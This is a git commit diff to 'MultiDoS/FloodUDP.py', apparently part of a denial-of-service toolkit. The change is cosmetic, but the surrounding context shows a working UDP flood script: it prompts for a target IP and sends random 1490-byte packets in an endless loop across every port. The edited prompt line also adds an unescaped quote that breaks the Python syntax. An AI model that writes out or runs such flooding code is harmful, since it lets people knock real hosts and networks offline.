786b6f1507dd4716b0531403d21dfc8153afa19e
Invalid Random <108237990+invalidrandom@users.noreply.github.com>
2022-06-27 13:54:52 -0400

    Update FloodUDP.py
    just aesthetic to the code

--- MultiDoS/FloodUDP.py
+++ MultiDoS/FloodUDP.py
@@ -12,7 +12,7 @@ year = now.year
 sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 bytes = random._urandom(1490)
 
-ip = raw_input('Enter target ip: ')
+ip = raw_input('Enter target's ip: ')
 port = input('Enter port: ')
 print "Attack started on {0}.{1} | {2}-{3}-{4}".format(hour, minute, day, month, year)
 time.sleep(3)
@@ -22,6 +22,6 @@ while True:
      sock.sendto(bytes, (ip,port))
      sent = sent + 1
      port = port + 1
-     print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
+     print "Sent %s packets to %s throught port: %s"%(sent,ip,port)
      if port == 65534:
        port = 1
